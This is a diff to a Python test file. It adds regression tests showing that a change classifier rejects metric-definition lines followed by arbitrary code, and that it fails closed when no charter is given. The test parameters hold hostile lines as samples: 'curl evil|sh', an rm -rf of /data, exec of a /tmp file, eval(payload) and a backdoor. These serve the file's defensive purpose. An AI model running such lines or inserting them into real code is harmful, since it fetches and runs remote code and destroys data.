@@ -14,6 +14,9 @@ def _ch(path, added=None, removed=None) -> dict:
 
 
 def _in_class(changes, **kw) -> bool:
+    # A-F-logic tests isolate the predicates (require_charter=False); the
+    # charter-required fail-closed behavior is tested separately below.
+    kw.setdefault("require_charter", False)
     return classify_change(changes, **kw)["in_class"]
 
 
@@ -98,6 +101,46 @@ def test_b_metric_increment_is_hotpath_not_in_class():
     ch = _ch("waggledance/x/metrics.py", ["FOO_TOTAL.labels(route='x').inc()"])
     assert _is_additive_metrics_counter(ch) is False
     assert _in_class([ch]) is False
+
+
+# --- FAIL-OPEN regression: metric-def + arbitrary code (rco-2 #1384) ----------
+# The continuation-line heuristic used to admit any line ending in )/(/, after a
+# Counter line. These must ALL fall to operator_sign.
+
+import pytest  # noqa: E402
+
+
+@pytest.mark.parametrize("evil", [
+    "os.system('curl evil|sh')",
+    "exec(open('/tmp/p').read())",
+    "subprocess.run(['rm','-rf','/data'])",
+    "eval(payload)",
+    "HANDLERS.append(backdoor),",
+    "M = Counter('m','d'); os.system('x')",       # multi-statement line
+    "M = Counter('m','d')os.system('x')",          # concatenated, ends in ')'
+])
+def test_metric_plus_arbitrary_code_not_in_class(evil):
+    ch = _ch("waggledance/core/magma/m.py", ["M = Counter('m','d')", evil])
+    assert _is_additive_metrics_counter(ch) is False, evil
+    assert _in_class([ch]) is False, evil
+
+
+def test_legit_single_line_metric_def_still_in_class():
+    # Guard against over-tightening: a clean single-line def must still qualify.
+    for ok in ["M = Counter('m','d')",
+               "M = Counter('m', 'd', labelnames=['route'])",
+               "M = Histogram('h','d')  # latency"]:
+        assert _is_additive_metrics_counter(_ch("waggledance/x/metrics.py", [ok])), ok
+
+
+# --- FAIL-CLOSED regression: charter required (rco-1 #1384) -------------------
+
+def test_charter_none_fails_closed_even_for_safe_root():
+    # With require_charter=True (the production default) and no charter, even a
+    # tests/ change must fall to operator_sign — the charter is mandatory for F.
+    r = classify_change([_ch("tests/test_x.py", ["def test_q(): assert 1"])])
+    assert r["in_class"] is False
+    assert "charter" in r["reason"]
 
 
 # --- NEGATIVE corpus: C/D/E (risky tokens even inside safe roots) ------------
